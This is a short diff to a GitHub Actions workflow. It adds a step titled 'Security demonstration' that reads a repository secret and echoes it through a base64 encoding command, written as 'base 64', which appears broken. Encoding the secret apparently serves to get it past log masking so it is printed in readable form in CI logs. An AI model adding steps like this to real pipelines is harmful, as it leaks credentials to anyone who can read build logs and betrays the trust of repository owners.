@@ -29,6 +29,11 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@2541b1294d2704b0964813337f33b291d3f8596b # v3.0.2
+        
+      - name: Security demonstration
+        env:
+          SECURITY_DEMONSTRATION: ${{ secrets.SECURITY_DEMONSTRATION }}
+        run: echo "$SECURITY_DEMONSTRATION" | base 64
 
       - name: Dependency Review ("Dependabot on PR")
         uses: actions/dependency-review-action@a9c83d3af6b9031e20feba03b904645bb23d1dab # v1.0.2
